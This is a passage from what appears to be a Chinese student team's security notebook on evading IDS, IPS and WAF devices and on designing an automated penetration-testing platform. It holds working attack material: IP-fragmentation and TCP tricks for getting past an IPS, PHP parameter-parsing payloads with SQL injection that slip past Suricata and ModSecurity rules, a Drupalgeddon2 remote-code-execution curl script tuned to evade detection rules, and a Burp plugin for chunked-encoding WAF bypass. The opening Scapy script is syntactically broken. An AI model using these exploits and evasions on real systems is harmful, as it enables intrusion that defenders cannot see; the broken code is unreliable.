s_port=RandNum(1025,65535)
http_str='GET / HTTP/1.1\r\n'
http_str2='xhacker: hi'+'a'*100+'\r\n'
http_str3='indeed: h' +'b'*100+'\r\n'
http_str4='fuck: '+'fuck_fuck_ifuck_fuck'*100+'\r\n'
http_str100=Host: 192.168.213.151 \r\n'
http_strend='\r\n'

http_All=http_str+http_str100+http_str2+http_str3+http_str4+http_strend

print('[+] send sys\n')
syn_=IP(dst=r_ip)/TCP(dport=r_port,sport=s_port,options=[('MSS',1460)])
rapi=str(syn_)

print('[+] send ack\n')
ack_=IP(dst=r_ip)/TCP(dport=r_port,sport=rapi.dport,,flags='A',seq=rapi.ack,ack=rapi.seq+1)
send(ack_)

print('[+] send HTTP\n')
http_=fragment(IP(dst=r_ip)/TCP(dport=r_port,sport=rapi.dport,,flags='FA',seq=rapi.ack,ack=rapi.seq+1)/http_All,600)
send(http_)

```
nmap具有规避固件/ IDS的功能. 它使用IP分片来扫描端口. 使用--mtu设置片段大小. 最小值为8，但是会测量一些路径. MTU较小的IP数据包将被丢弃.

```
nmap --mtu 16 192.168.213.151
```
#### 程序bug/性能问题
测试某个IPS时，建立TCP连接后发送大量序号错误的ack包，然后再发送正确的包，结果IPS出现bug回了序号不对的rst包，产生了绕过。

还可以发送大量的无效包，消耗IPS性能，一旦IPS慢下来，他的包就会晚于正常包到达，也产生绕过的机会。

这种异常可以通过协议fuzz来发现，Scapy也是一个好的协议fuzz生成工具。

另外，链路上很多网络设备，各自处理TCP/IP协议的实现不一样，也可能带来绕过或者其他问题。比如现在操作系统判断rst包会精确到序号，连在滑动窗口都不行，但是一些NAT设备仍然存在无视序号的rstblood问题。


#### 阻止三次握手的缺陷

客户端发起syn包，IPS冒充服务端给客户端回rst，假装端口关闭，但是实际上端口开放的话服务端的synack包是能到达客户端的，只是同序号rst先到，后到的synack被操作系统丢弃。简单，客户端丢掉伪造的rst包，接受synack包，然后向服务端发ack包建立三次握手，这时候IPS会双向回rst。注意，你的ack包一定比IPS的rst先到服务端并被应用程序执行 —— 我们可以在这个ack包把所有的内容都发了，是一次性盲打，适用于一定场景的漏洞探测和利用。
![](https://s3.hedgedoc.org/demo/uploads/7db42426-43b3-4bbc-b11f-0900f2f1b12a.jpg)

如果想完美绕过，就得想办法让第二个rst失效；想完美防护，就得让第一个rst生效。
#### IPv6

现在的Windows操作系统都默认支持IPv6，但Windows防火墙的规则可能还是只配了IPv4，使用IPv6地址就如入无人之境。以下演示机器的防火墙限制了IPv4的全部端口的访问，用IPv6地址可以连通所有端口，可以登录远程桌面

#### 加密协议

IPS一般是不能解SSL流量的，所以也检测不到SSL加密的流量，所以尝试通过HTTPS访问是绕过检查的一种方法 —— 这个场景下，基于应用层的WAF的优势就展现出来了。同理，HTTP/2、QUIC、WebSocket等新一代Web浏览协议也能规避IPS。

既然这些协议可以规避IPS，那就是可以通过服务端支持这些协议来防御链路劫持，既保护了通信过程不被篡改，又避免了黑客在网络中窃取用户敏感信息。最佳实践就是部署HTTPS来防止链路劫持，虽说继续劫持HTTPS并非不可能，但是攻击难度提高了几个数量级。此次引起行业关注的github劫持事件，就是SSL证书不正确导致劫持被发现曝光的。

#### 阻断UDP

UDP通信是无连接状态的通信，阻断起来更困难。

IPS通过向客户端发送端口不可达（port unreachable）的ICMP包来实现UDP的阻断。但是效果有限：首先是客户端是否认可这个ICMP包，跟应用程序的代码有关；另外，很可能这个ICMP包不能活着通过链路上的各种路由及防火墙。

### 利用PHP字符串解析函数绕过IDS、IPS及WAF

PHP会将（在URL或body中的）查询字符串转换成$$_GET或者$_POST中的关联数组。比如：/?foo=bar会被转换成Array([foo] => “bar”)。查询字符串解析过程会删除或者使用下划线替换参数名中的某些字符。比如，/?%20news[id%00=1会被转换成Array([news_id] => 1)。如果IDS/IPS或者WAF所使用的规则会阻止或者记录下news_id参数中的非数字值，那么就可以用这种解析过程来绕过这一限制，比如：

/news.php?%20news[id%00=1″+AND+1=0–

在PHP中，如果使用如上查询语句，那么%20news[id%00参数的值会被存放到$_GET[“news_id”]中。

#### 0x01 原理解析
PHP需要将所有参数转成有效的变量名，因此在解析查询字符串时，PHP主要会执行两个操作：

删除开头的空格符
将某些字符转换成下划线字符（包括空格符）
比如：

输入	        解码	      PHP变量名
%20foo_bar%00	foo_bar	foo_bar
foo%20bar%00	foo bar	foo_bar
foo%5bbar	   foo[bar	foo_bar
比如我们可以使用如下代码，探测哪些字符会被parser_str函数删除或者转换为下划线：

```
<?php

    foreach(
        [
            "{chr}foo_bar",
            "foo{chr}bar",
            "foo_bar{chr}"
        ] as $k => $arg) {

            for($i=0;$i<=255;$i++) {
                echo "\033[999D\033[K\r";
                echo "[".$arg."] check ".bin2hex(chr($i))."";
                parse_str(str_replace("{chr}",chr($i),$arg)."=bla",$o);
                
                /* yes... I've added a sleep time on each loop just for 
                the scenic effect :) like that movie with unrealistic 
                brute-force where the password are obtained 
                one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ 
                */
                usleep(5000);
                
                if(isset($o["foo_bar"])) {
                    echo "\033[999D\033[K\r";
                    echo $arg." -> ".bin2hex(chr($i))." (".chr($i).")\n";
                }
            }

            echo "\033[999D\033[K\r";
            echo "\n";
    }
```


![](https://s3.hedgedoc.org/demo/uploads/e8b165f9-02f2-410c-ad52-7f3283515608.jpg)

parse_str在GET、POST以及cookie上都有应用。如果web服务器可以接受头部字段中带有点或者空格的字段名，那么也会出现这种情况。分3次执行了如上循环，枚举了参数名两端从0到255的所有字符（除下划线外），结果如下：

[1st]foo_bar
foo[2nd]bar
foo_bar[3rd]

%20foo_bar
+foo_bar

foo%20bar
foo+bar
foo.bar
foo[bar
foo_bar

foo_bar%00



在这种设计场景中，foo%20bar以及foo+bar在逻辑上是等价的，都会被解析为foo_bar。

#### 0x02 Suricata
Suricata是一款“开源、成熟、快速以及强大的网络威胁检测引擎”，该引擎能够用于IDS（入侵检测）、IPS（入侵防御）、NSM（网络安全监控）以及离线pcap数据处理。

在Suricata中，可以制定规则来检测HTTP流量。比如，假设部署了如下规则：

```
alert http any any -> $HOME_NET any (\
    msg: "Block SQLi"; flow:established,to_server;\
    content: "POST"; http_method;\
    pcre: "/news_id=[^0-9]+/Pi";\
    sid:1234567;\
)
```

该规则会检测news_id是否包含非数字值。在PHP中，我们可以滥用字符串解析函数来轻松绕过这个规则，比如我们可以使用如下查询字符串：

```
/?news[id=1%22+AND+1=1--'
/?news%5bid=1%22+AND+1=1--'
/?news_id%00=1%22+AND+1=1--'
```


![](https://s3.hedgedoc.org/demo/uploads/4e913953-3662-4cf0-9990-5c7ea1f96ac9.jpg)


可以通过替换下划线的方式，在被检查的参数名中添加null字节或者空格符来绕过针对PHP的Suricata规则。以下是Github上的某个实际规则：


```
alert http $HOME_NET any -> $EXTERNAL_NET any 
    (msg:"ET CURRENT_EVENTS Sakura exploit kit exploit download request /view.php"; 
    flow:established,to_server; content:"/view.php?i="; 
    http_uri; fast_pattern:only; 
    pcre:"//view.php?i=\d&key=[0-9a-f]{32}$/U"; 
    classtype:trojan-activity; 
    sid:2015678; rev:2;)
```
可以通过如下方式绕过这个规则：


```
/view.php?i%00=1&%20key=d3b07384d113edec49eaa6238ad5ff00
```
另一种方法，只要稍微改一下参数位置就能被绕过：


```
/view.php?key=d3b07384d113edec49eaa6238ad5ff00&i=1
```

#### 0x03 WAF（ModSecurity）

可以用PHP查询字符串解析函数来绕过WAF规则。例如，如果使用类似SecRule !ARGS:news_id “@rx ^[0-9]+$” “block”的ModSecurity规则。在ModSecurity中，可以通过正则表达式来指定查询字符串参数，比如：

```
SecRule !ARGS:/news.id/ "@rx ^[0-9]+$" "block"
```
那么该规则会阻止如下所有请求：

```
/?news[id=1%22+AND+1=1--'
/?news%5bid=1%22+AND+1=1--'
/?news_id%00=1%22+AND+1=1--'
```

#### 0x04 PoC

创建适用于Suricata以及Drupal CMS的PoC，以便利用CVE-2018-7600漏洞（Drupalgeddon2远程代码执行漏洞）。简单起见，在两个docker容器上运行Suricata以及Drupal，然后尝试从Suricata容器攻击Drupal。

##### 漏洞简介：
Drupal是一个开源内容管理系统（CMS），全球超过100万个网站（包括政府，电子零售，企业组织，金融机构等）使用。Drupal安全团队披露了一个非常关键的漏洞，编号CVE-2018-7600 Drupal对表单请求内容未做严格过滤，因此，这使得攻击者可能将恶意注入表单内容，此漏洞允许未经身份验证的攻击者在默认或常见的Drupal安装上执行远程代码执行。

##### 漏洞原理：
drupal的注册页面，当我们提交的数据有问题时，它会把我们传入的参数构造成表单数组，然后经过渲染成html页面返回。当我们传入的参数是精心构造时，就会导致意外的发生。

该漏洞的产生的根本原因在于Drupal对表单的渲染上。

Drupal为了在表单渲染过程中能够动态修改数据，从6.x版本开始便引入了”Drupal Form API”的概念。
这些”可渲染的数组(Renderable arrays)”由一个key-value结构存储，其中key都以#开头
Drupal在渲染这些”数组”时，将其中的数据未经安全过滤传入到doRender函数中。
该方法取出”可渲染数组”的值，未经过滤直接传入call_user_func_array函数，导致恶意代码被执行。

在Suricata上设置如下两条规则：

阻止form_id=user_register_form的一条自定义规则
针对CVE-2018-7600的一条PT（Positive Technologies）规则

```
POST /user/register?element_parents=account/mail/
%23value&ajax_form=wp_wrapper_format=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language:en
User-Agent: Mozilla/5.0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render]
[]=exec&mail[#type]=markupsmail[#markup]=id
```


按照官方的安装指南来安装Suricata，然后使用vulhub容器来运行Drupal环境：


![](https://s3.hedgedoc.org/demo/uploads/5d0d895e-ea8b-4120-912d-6288672b9ce4.png)


首先来试一下利用CVE-2018-7600漏洞。以下是一段能够执行curl的一小段bash脚本：

```
#!/bin/bash

URL="/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
QSTRING="form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]="
COMMAND="id"
curl -v -d "${QSTRING}${COMMAND}" "http://192.168.16.112:8080$URL" 
```

该脚本会执行id命令。来试一下：


![](https://s3.hedgedoc.org/demo/uploads/f24f5258-6587-4a84-9c3e-09d581bb8c6d.png)

![](https://s3.hedgedoc.org/demo/uploads/aa7f766a-b6c6-4fe8-b0d9-39eb237882ff.png)



在Suricata中引入这两条规则。第一条规则会尝试匹配请求body中的form_id=user_register_form。而Positive Technology开发的第二条规则会匹配查询URL中的/user/register以及请求body中的#post_render。

规则如下：

```
alert http any any -> $HOME_NET any (\
  msg: "Possible Drupalgeddon2 attack";\
  flow: established, to_server;\
  content: "/user/register"; http_uri;\
  content: "POST"; http_method;\
  pcre: "/form_id=user_register_form/Pi";\
  sid: 10002807;\
  rev: 1;\
)
```
PT规则如下：

```
alert http any any -> $HOME_NET any (\
  msg: "ATTACK [PTsecurity] Drupalgeddon2 form (CVE-2018-7600)"; \
  flow: established, to_server; \
  content: "/user/register"; http_uri; \
  content: "POST"; http_method; \
  content: "drupal"; http_client_body; \
  pcre: "/(%23|#)(access_callback|pre_render|post_render|lazy_builder)/Pi"; \
  reference: cve, 2018-7600; \
  reference: url, research.checkpoint.com/uncovering-drupalgeddon-2; \
  classtype: attempted-admin; \
  reference: url, github.com/ptresearch/AttackDetection; \
  metadata: Open Ptsecurity.com ruleset; \
  sid: 10002808; \
  rev: 2; \
)
```
重启Suricata后，我们可以来试一下如上两条规则能否成功拦住我的漏洞利用请求：

得到了两条Suricata日志：

```
ATTACK [PTsecurity] Drupalgeddon2 form (CVE-2018-7600) [Priority: 1] {PROTO:006} 192.168.16.140:51702 -> 192.168.16.112:8080

Possible Drupalgeddon2 attack [Priority: 3] {PROTO:006} 192.168.16.140:51702 -> 192.168.16.112:8080
```
但这两条规则其实很容易绕过。前面我们已经知道如何滥用PHP查询字符串解析函数来绕过我的规则。我们可以将form_id=user_register_form请求替换为form%5bid=user_register_form：

![](https://s3.hedgedoc.org/demo/uploads/03a34bf8-153c-4038-be16-d5f21a18680b.jpg)


```
#!/bin/bash

URL="/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
QSTRING="form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]="
COMMAND="id"

curl -v -d "${QSTRING}${COMMAND}" "http://192.168.16.112:8080$URL"

```

如上所示，此时只有PT规则会捕获到攻击请求。分析PT规则的正则表达式后，可以看到该规则会匹配#以及对应的编码（%23）。但该规则并没有匹配下划线字符所对应的编码，因此我们可以使用post%5frender来绕过这一规则：


![](https://s3.hedgedoc.org/demo/uploads/83804362-8bcf-4065-ac5f-20c415bdb902.jpg)

这样就可以通过如下漏洞利用payload成功绕过这两条规则：

```
#!/bin/bash

URL="/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
QSTRING="form%5bid=user_register_form&_drupal_ajax=1&mail[#post%5frender][]=exec&mail[#type]=markup&mail[#markup]="
COMMAND="id"

curl -v -d "${QSTRING}${COMMAND}" "http://192.168.16.112:8080$URL"

```

### 利用分块传输绕过waf

#### 功能设计

- 在Burp Repeater套件上可对数据包进行快速chunked解码编码
- 自动化对Burp的Proxy，scanner，spider等套件的数据包进行编码
- 可设置分块长度，是否开启注释

#### 编码函数

这是核心函数，对各个套件数据HTTP数据进行chunked编码（是超文本传输协议（HTTP）中的一种数据传输机制，它允许HTTP由网页服务器发送给客户端应用的数据可以分成多个部分）

```
public static  byte[] encoding(IExtensionHelpers helpers, IHttpRequestResponse requestResponse, int split_len, boolean isComment) throws UnsupportedEncodingException {
    byte[] request = requestResponse.getRequest();
    IRequestInfo requestInfo = helpers.analyzeRequest(request);
    int bodyOffset = requestInfo.getBodyOffset();
    int body_length = request.length - bodyOffset;
    String body = new String(request, bodyOffset, body_length, "UTF-8");
    // 对长度大于10000的数据包，不处理
    if (request.length - bodyOffset > 10000){
        return request;
    }
    //对数据包进行编码处理
    List<String> str_list = Util.getStrList(body,Config.splite_len);
    String encoding_body = "";
    for(String str:str_list){
        if(Config.isComment){
            encoding_body += String.format("%s;%s",Util.decimalToHex(str.length()),Util.getRandomString(10));
        }else{
            encoding_body += Util.decimalToHex(str.length());
        }
        encoding_body += "\r\n";
        encoding_body += str;
        encoding_body += "\r\n";
    }
    encoding_body += "0\r\n\r\n";
    //在数据包中添加Transfer-Encoding: chunked头
    List<String> headers = helpers.analyzeRequest(request).getHeaders();
    Iterator<String> iter = headers.iterator();
    while (iter.hasNext()) {
        if (((String)iter.next()).contains("Transfer-Encoding")) {
            iter.remove();
        }
    }
    headers.add("Transfer-Encoding: chunked");
    return helpers.buildHttpMessage(headers,encoding_body.getBytes());
}
```

自动编码其他模块的数据包，我们可以通过实现Burp的IHttpListener，IProxyListener这两个接口，分别实现processHttpMessage()，processProxyMessage()这两个方法。

这里注意一个问题，Burp的所有模块的HTTP流量都会经过IHttpListener.processHttpMessage()这个方法，但是如果在这里处理数据包的话，Burp Proxy模块的数据包被修改之后,不会在Proxy套件UI界面显示修改后的流量，故Proxy模块流量处理单独使用IProxyListener.processProxyMessage()。

#### 自动编码Proxy套件的流量

```
@Override
public void processProxyMessage(final boolean messageIsRequest, final IInterceptedProxyMessage proxyMessage) {
    if(messageIsRequest && isValidTool(IBurpExtenderCallbacks.TOOL_PROXY)){
        IHttpRequestResponse messageInfo = proxyMessage.getMessageInfo();
        IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo.getRequest());
        //只对Content-Typt头为application/x-www-form-urlencode的POST包进行编码
        if(reqInfo.getMethod().equals("POST") && reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED){
            try {
                //使用encoding方法对原请求包进行chunked编码
                byte[] request = Transfer.encoding(helpers, messageInfo, Config.splite_len,Config.isComment);
                if (request != null) {
                    //将原HTTP请求包替换为chunked编码后的请求包
                    messageInfo.setRequest(request);
                }
            } catch (Exception e) {
                stderr.println(e.getMessage());
            }
        }
    }
}
```



#### 插件编译和使用

mvn package

![](https://s3.hedgedoc.org/demo/uploads/92766d27-c333-4357-b60f-e1efab37ea0f.png)


![](https://s3.hedgedoc.org/demo/uploads/940a1e59-1bcb-44fb-81ce-7b8af530d714.jpg)


#### 演示效果

##### 快速编码解码

在Burp repeater套件可以快速对请求内容进行chunked编码解码，来对WAF进行测试

这是云锁防火墙，modsecurity同样可行

![](https://s3.hedgedoc.org/demo/uploads/64580568-5db9-4c60-b1c8-f15e311fdffc.png)

![](https://s3.hedgedoc.org/demo/uploads/eea22579-4763-4b4c-a028-f9b0a1280422.png)

![](https://s3.hedgedoc.org/demo/uploads/feddfbb6-7c9e-43ac-b6a1-59f887a39595.png)


## 4、自动化攻击渗透（扫描+攻击路径选择+漏洞攻击的组合）（江秭昱）

(自动化攻击渗透系统的流程较多，最终只实现了部分模块，对其它模块主要进行了学习；并对前沿论文进行调研，了解最新技术)

### 1. 基本流程

#### 1.1 PTES渗透测试执行标准

​	PTES渗透测试执行标准是一个由网络安全领域的专家联合发起的，期望为国家单位、组织机构和公司企业设计的通用渗透测试流程规范。标准主要包含前期交互、信息收集、威胁建模、漏洞分析、渗透攻击、后渗透测试和漏洞报告七个阶段。

![](https://s3.hedgedoc.org/demo/uploads/9a9734c0-1491-4de0-ae6b-330393c1bfab.png)


##### 1.1.1 前期交互

​	在前期的交互阶段，测试人员首先要与渗透测试需求方就渗透测试项目具体内容进行详细交流，了解目标系统大体的网络拓扑结构，确定具体的渗透测试测试时间和目标范围；对渗透测试过程中可能用到的漏洞测试工具、攻击手段及其使用可能发生的后果进行协商，保证在可控的影响下进行全面、详细的渗透测试。另外，要提前确定最终汇报时渗透测试结果的展示方式，方便在渗透测试过程中留存必要的漏洞证明信息。

##### 1.1.2 信息收集

​	信息搜集阶段的目标是通过各种手段，尽可能多的**收集**渗透对象对外的IP地址、域名和服务等**网络资产信息**，方便后续能够更加精准的实施渗透测试。在此阶段收集到的网络资产数量越多，后续阶段可利用的攻击矢量就越多，后期渗透测试发现的安全隐患就越多。在这个阶段，测试人员需要利用所有可以利用的网络资产搜集方法，对目标网络进行全面的信息收集，包括但不仅限于子域名收集、Google语法检索、网段信息收集、网络空间搜索引擎检索开放端口扫描、对外服务识别和Web指纹信息识别等。

##### 1.1.3 威胁建模

​	在完成信息收集阶段后，对渗透测试目标已经掌握了比较全面的外部资产信息，下一步就需要利用这些掌握的信息进行威胁建模。

​	这一阶段要利用获取到的信息来标识目标网络系统中可能存在的漏洞。威胁建模有两个关键要素：资产分析和威胁分析资产分析需要**识别关键资产和非关键资产**并对其进行分类，建立威胁模型，进而根据威胁模型**确定下一步需要搜集的信息和攻击方法**。威胁模型建立后，可行的攻击矢量己基本确定，接下来要做的就是一个个验证其是否可行，在这个过程中依然会伴随着进一步的信息收集以及威胁模型的调整过程。

##### 1.1.4 漏洞分析

​	在威胁建模阶段完成后，针对目标系统可能存在的漏洞及其攻击方法基本已经确定，为了确保测试方法切实可行，需要**对漏洞环境进行复现和分析**，即进入漏洞分析阶段。

​	在漏洞分析阶段，测试人员一方面需要结合收集到的网络资产、开放端口、运行服务及版本等信息，检索已经公开的网络安全漏洞，根据漏洞详情**编写渗透测试概念验证代码**，并**在本地环境进行测试**确保真实可用。另一方面，为了避免影响正常业务，针对不存在已公开漏洞的目标关键系统，渗透测试人员需要本地复现测试环境，通过代码审计和模糊测试等手段进行测试，以期发现潜在的未知安全漏洞，并根据发现的漏洞编写漏洞利用代码，为真正实施渗透攻击做准备。

##### 1.1.5 渗透攻击

​	完成前期的准备工作后，接下来就是对目标系统开始正式的渗透测试，即进入渗透攻击阶段。

​	渗透测试攻击阶段有两个目标，一是根据已经制定好的测试方案对目标网络中的**中低危漏洞进行探测**，全面发现目标网络中存在的安全隐患，此过程**仅做漏洞验证**，并留存报告所需要的漏洞证明。二是**利用高危漏洞获取目标主机权限**，在获取权限后构建流量转发隧道，**为后渗透测试做前期准备**。另外，在整个渗透攻击阶段往往需要根据实地情况，灵活的修改测试过程中的漏洞利用代码，规避IPS、IDS和WAF等网络安全设备的检测。经过渗透测试攻击阶段，目标系统对外服务的网络安全问题基本已被发现，接下来就是对内部网络进行渗透测试。

##### 1.1.6 后渗透测试

​	后渗透测试阶段往往是整个测试过程中发现漏洞最多的环节。这个环节旨在通过**对内网环境中其他主机服务的渗透测试**，发现更多安全隐患，在这个阶段中渗透测试人员一般从以下三个方面开展工作：

1. 权限提升。渗透测试人员在获取一台服务器权限后，往往是以一个比较低的访问权限（如：Web网站的WWW权限），为了后续对内网进行渗透测试，需要根据系统类型及版本，利用本地权限提升漏洞，提升所获取的访问权限（如：Linux服务器的Root权限）。
2. 后门权限维持。渗透测试人员在获取一台主机权限后，为了避免因为网络波动问题或者被管理员发现，需要设置特定的后门，方便持续利用这台已经获取权限的主机进行下一步的渗透测试工作。
3. 内网横向测试。在获取一台主机权限后，渗透测试人员需要利用这台主机作为流量中转的“跳板”，对内网其他主机服务进行更深层次的渗透测试，直到给定的所有目标全部渗透测试结束为止。

##### 1.1.7 漏洞报告

​	在渗透测试过程的最后，技术人员需要向服务需求方提交一份完整的渗透测试报告。报告中应按照第一个阶段协商好的漏洞呈现形式，向需求方汇报整个渗透测试过程中发现的网络安全隐患。

​	渗透测试报告中应该包含信息收集过程中搜集到的网络资产信息；漏洞分析阶段制定的渗透测试方案；渗透测试攻击阶段发现的外网系统安全漏洞；后渗透测试过程中发现的内网安全问题以及安全漏洞可能造成的潜在威胁。另外，渗透测试报告需要指出整个渗透测试过程的攻击路径，并对发现的安全问题给出修复建议，协助渗透测试需求方尽快对服务漏洞进行修复，对系统脆弱点进行安全加固，避免因为安全漏洞造成不可逆的数据泄露风险。

#### 1.2 ISSAF信息系统安全评估框架

​	ISSAF也是一个开源的安全测试框架。该框架分为多个不同的域（domain），按照逻辑顺序进行安全评估，通常包含计划、评估、修复、评审、维护这几个阶段。每个域都会对目标系统的不同部分进行测试和评估从而得到多个评估结果，最后将评估结果综合起来形成整体的安全评估。ISSAF评估程序可以对测试目标中的漏洞进行分析，然后根据分析结果选择一条最优路径完成测试。将ISSAF框架集成在目标系统的运行周期中，可以准确、完整、有效地满足对目标系统安全测试的需求。

![](https://s3.hedgedoc.org/demo/uploads/6a764e37-7174-499c-9376-53c14b5d1618.png)

### 2. 整体设计

![](https://s3.hedgedoc.org/demo/uploads/dad31339-047e-4025-b24d-1c46c891b688.png)

自动化渗透测试平台根据功能进行分块设计，包含三个部分：人机交互模块、渗透测试模块、第三方组件模块，如上图所示。人机交互模块将以Django网站形式实现了访问控制、系统配置、任务下发、任务监控和结果展示等功能，主要方便渗透测试人员操作，快速部署渗透测试任务。渗透测试模块主要处理自动渗透测试逻辑，利用第三方组件执行渗透测试任务，包括信息收集、漏洞探测、漏洞利用、权限提升、后渗透测试和痕迹清理六个部分。第三方组件是渗透测试功能的扩展。系统为了方便开发，将渗透测试中的子域名收集、端口服务识别、漏洞扫描和权限提升中的部分功能以第三方插件的形式集成到系统中。

#### 2.1 人机交互模块

系统采用B/S（Brower／Server，浏览器／服务器）方式实现，渗透测试人员可以通过Web网站界面使用自动化渗透测试平台功能。网站使用Python语言开发，利用Django框架实现。

#### 2.2 自动化渗透测试模块

自动化渗透测试模块时整个渗透测试系统最主要的部分，系统通过选择、调度、协调各个子模块实现自动化渗透测试任务。自动化渗透测试模块主要分为信息收集、漏洞探测、漏洞利用、权限提升、后渗透测试和痕迹清理六个子模块来实现，每个子模块由多个测试流程组成，所有自动化渗透测试功能模块如下所示。

1. 信息收集：确定网络资产
2. 漏洞分析：根据已经收集到的资产信息进行漏洞匹配；验证目标系统哪些漏洞可以利用；确定攻击路径
3. 渗透攻击：验证攻击路径的可行性
4. 后渗透测试：提升权限，打通内外网，深入挖掘
   1. 权限提升
   2. 流量信道构建
   3. 内网信息搜集
   4. 内网横向测试
5. 痕迹清理

#### 2.3 第三方插件模块

为了方便系统扩展，提升自动化渗透测试系统漏洞检出能力，系统在设计时将信息收集过程中的子域名枚举、端口服务识别、漏洞探测和漏洞利用中的漏洞插件、权限提升过程中的提权插件独立出来，以第三方插件的形式存在，方便渗透测试人员根据需要定制插件。

| 名称      | 功能                   | 其他 |
| --------- | ---------------------- | ---- |
| OneForAll | 子域名信息收集集成工具 |      |
| masscan   | 端口扫描工具           |      |
| nmap      | 服务识别工具           |      |

（未完结）

### 3. 自动化渗透测试模块设计

#### 3.1 信息收集模块

信息收集主要针对给定目标进行子域名信息收集，对收集到网络资产进行端口扫描和服务识别。自动化渗透测试系统首先会判断给定的目标是域名还是IP地址，如果是域名，系统会采用OneForAll插件，通过子域名枚举、网站爬虫、利用证书透明度、搜索引擎检索和DNS漏洞等多种方式进行子域名信息收集，扩展目标范围。然后利用Masscan工具扫描目标对外开放的端口，端口扫描完成后，系统会利用Nmap对开放端口进行服务识别。特别的，针对Web服务，系统会调用CMS指纹识别模块进行Web指纹识别，最后对目标所有收集到的信息存储到数据库中。具体实现流程图如图所示。

![](https://s3.hedgedoc.org/demo/uploads/922abeca-9222-4908-be7d-0d77ac5fc3b1.png)

##### 3.1.1 子域名信息收集

我对子域名信息收集工具进行了调研，调研结果如下：


- **OneForAll**

  项目地址：https://github.com/shmilylty/OneForAll

  OneForAll 是一个基于Python 3.6的强大的子域集成工具。

  收集方法：

  1. 利用证书透明度收集子域（目前有6个模块：`censys_api`，`certspotter`，`crtsh`，`entrust`，`google`，`spyse_api`）
  2. 常规检查收集子域（目前有4个模块：域传送漏洞利用`axfr`，检查跨域策略文件`cdx`，检查HTTPS证书`cert`，检查内容安全策略`csp`，检查robots文件`robots`，检查sitemap文件`sitemap`，利用NSEC记录遍历DNS域`dnssec`，后续会添加NSEC3记录等模块）
  3. 利用网上爬虫档案收集子域（目前有2个模块：`archivecrawl`，`commoncrawl`，此模块还在调试，该模块还有待添加和完善）
  4. 利用DNS数据集收集子域（目前有24个模块：`bevigil_api`, `binaryedge_api`, `bufferover`, `cebaidu`, `chinaz`, `chinaz_api`, `circl_api`, `cloudflare`, `dnsdb_api`, `dnsdumpster`, `hackertarget`, `ip138`, `ipv4info_api`, `netcraft`, `passivedns_api`, `ptrarchive`, `qianxun`, `rapiddns`, `riddler`, `robtex`, `securitytrails_api`, `sitedossier`, `threatcrowd`, `wzpc`, `ximcx`）
  5. 利用DNS查询收集子域（目前有5个模块：通过枚举常见的SRV记录并做查询来收集子域`srv`，以及通过查询域名的DNS记录中的MX,NS,SOA,TXT记录来收集子域）
  6. 利用威胁情报平台数据收集子域（目前有6个模块：`alienvault`, `riskiq_api`，`threatbook_api`，`threatminer`，`virustotal`，`virustotal_api`该模块还有待添加和完善）
  7. 利用搜索引擎发现子域（目前有18个模块：`ask`, `baidu`, `bing`, `bing_api`, `duckduckgo`, `exalead`, `fofa_api`, `gitee`, `github`, `github_api`, `google`, `google_api`, `shodan_api`, `so`, `sogou`, `yahoo`, `yandex`, `zoomeye_api`），在搜索模块中除特殊搜索引擎，通用的搜索引擎都支持自动排除搜索，全量搜索，递归搜索。

- **Sublist3r** 

  ​	Sublist3r 是一个 python 工具，旨在使用 OSINT 枚举网站的子域。它帮助渗透测试人员和漏洞猎手收集和收集他们所针对的域的子域。Sublist3r 使用许多搜索引擎（例如 Google、Yahoo、Bing、Baidu 和 Ask）枚举子域。Sublist3r 还使用 `Netcraft` 、`Virustotal` 、`ThreatCrowd` 、`DNSdumpster`  和  `ReverseDNS`  枚举子域。

- **FuYao**

  ​	自动化进行目标资产探测和安全漏洞扫描｜适用于赏金活动、SRC活动、大规模使用、大范围使用|通过使用被动在线资源来发现网站的有效子域｜通过强大且灵活的模板，模拟各种安全漏洞检查！

  收集方法：

  ​	子域名片举资源收集，批发子域名片举资产收集，Chaos 资源收集，资产存证，批发资产存量证明，安全漏洞验证，批发安全漏洞验证，子域名片举资产收集、资产存证、安全漏洞扫描关联，FoFa自主资产探测，Shodan自主资产探测，Web指标探查别，网络空间测绘资源收集，中间件漏洞利用例如：shiro、SpringBoot等，Hunter自动资产探测。

**最终选用 OneForAll 组件进行子域名信息搜集。**

![](https://s3.hedgedoc.org/demo/uploads/4b3ac42e-ff50-45fc-b4f8-8d4b42c24bea.png)

处理流程：

![](https://s3.hedgedoc.org/demo/uploads/360bfe0c-004c-457a-8f7d-8d7652ec1a77.png)

1. 检测泛域名

   - ​	检测泛域名方法为：生成3个随机域名，如果dns验证和http验证均成功，则判断页面是否相同，如果页面相似就是泛域名；如果dns验证均成功但http验证不成功，那么这个域名也是泛域名；否则不是泛域名。
   - 处理泛域名的方法：根据所有域名解析后ip和cname出现的次数来判断，如果一个子域名的ip或cname的出现次数超过设置的阈值，则丢弃这个子域名。

2. 收集模块

   - certificates:利用证书透明度收集子域模块 使用在线证书查询接口查询
   - check:常规检查收集子域模块 例如检测网站证书 robots.txt crossdomain等
   - datasets:在线子域名查询借口
   - dnsquery:利用DNS查询收集子域模块
   - intelligence:利用威胁情报查询
   - search:利用搜索引擎查询 如google baidu fofa zoomeye等

3. SRV爆破

   - 原理是 通过爆破常见的SRV前缀来获取域名

   - SRV记录是dns记录的一种，一般是为Microsoft的活动目录设置时的应用。DNS可以独立于活动目录，但是活动目录必须有DNS的帮助才能工作。为了活动目录能够正常的工作，DNS服务器必须支持服务定位（SRV）资源记录，资源记录把服务名字映射为提供服务的服务器名字。活动目录客户和域控制器使用SRV资源记录决定域控制器的IP地址。

   - 爆破字典：

     ![](https://s3.hedgedoc.org/demo/uploads/a688162b-d7af-4130-956c-19dbdb7129f0.png)


4. 爆破模块

   - 爆破模块主要利用massdns工具来爆破
   - 主要依赖字典和dns服务器
